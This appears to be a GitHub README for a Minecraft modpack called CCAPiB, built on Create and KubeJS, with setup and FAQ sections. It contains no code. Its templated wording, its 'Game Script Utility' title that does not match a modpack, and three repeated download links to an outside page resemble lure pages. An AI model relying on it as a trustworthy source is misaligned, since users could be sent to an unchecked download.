# CCAPiB v2026 - Game Script Utility 2026

> **A Minecraft modpack built around structured progression.** It is centered on Create, KubeJS, and a guided gameplay route through the major Create ecosystem content.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Minecraft-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/zack-hill91/ccapib-v2026-game-script?style=flat-square)](https://github.com/zack-hill91/ccapib-v2026-game-script)

---

<p align="center">
  <a href="https://zack-hill91.github.io/ccapib-v2026-game-script/">
    <img src="https://img.shields.io/badge/Download-CCAPiB%20Script-brightgreen?style=for-the-badge" alt="Download CCAPiB Script">
  </a>
</p>

> **[Direct Download - CCAPiB](https://zack-hill91.github.io/ccapib-v2026-game-script/)**

---

[Download Latest Build](https://zack-hill91.github.io/ccapib-v2026-game-script/)

---

## What this pack does

CCAPiB is designed to shape Minecraft progression into a more deliberate path instead of opening everything at once. The pack uses Create as its foundation and relies on KubeJS to control how the experience unfolds across its systems and modules.

It brings together a chain of Create-focused expansions, such as Create: The Factory Must Grow, Create Metallurgy, Create Big Cannons, and Create Aeronautics. The overall effect is a modpack that favors ordered advancement, tighter mod interconnections, and a curated progression track through the included content.

## Script Features

- Linear progression structure for the modpack experience
- Create mod integration as the core gameplay foundation
- KubeJS scripting for progression and pack behavior
- Includes Create: The Factory Must Grow
- Includes Create Metallurgy
- Includes Create Big Cannons
- Includes Create Aeronautics
- Designed around a staged route through Create-related content

## Setup

1. Download the latest build from the project download page.
2. Import or place the modpack in your Minecraft launcher or modpack manager.
3. Launch the pack using the Minecraft version and loader required by the included mod set.
4. If you are editing the pack locally, keep the KubeJS scripts in their expected folder structure so progression changes remain applied.

Minimal example for local organization:

- `CCAPiB-minecraft-modpack/`
  - `kubejs/`
  - `mods/`
  - `config/`

## Configuration

This pack is shaped primarily by its included content and KubeJS scripts, not by a large built-in settings interface. Common places to make changes are:

| Setting Area | Purpose | Notes |
|---|---|---|
| KubeJS scripts | Progression logic | Controls how content is introduced |
| Mod list | Content scope | Determines which Create expansions are present |
| Config files | Gameplay tuning | Used for balance and pack behavior |
| Loader setup | Launch compatibility | Must match the Minecraft environment |

## Compatibility

CCAPiB is made for Minecraft and focuses on modded gameplay built around Create. Exact compatibility depends on the Minecraft version, the loader in use, and the dependencies needed by the bundled mods.

Points to keep in mind:

- The pack depends on Create and related addons.
- KubeJS-based changes require the pack to be loaded in a compatible environment.
- Unsupported mod versions or mismatched loader setups may prevent the pack from starting correctly.

## FAQ

**How do I install it?**  
Download the pack, then import it into your launcher or modpack manager, or place it in a local Minecraft instance using the expected folder layout.

**How do updates work?**  
Use the latest build from the download page and replace or merge files carefully if you have made local edits.

**Can I change progression?**  
Yes. The progression flow is handled through KubeJS, so you can adjust scripts if you are maintaining a custom version.

**What should I check if the pack does not launch?**  
Verify the Minecraft version, mod loader, and required mod dependencies. Also confirm that the KubeJS files are in the correct location.

**Does it need a special storage layout?**  
Keep the pack files organized in standard modpack folders such as `mods`, `config`, and `kubejs` so the setup remains readable and maintainable.

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
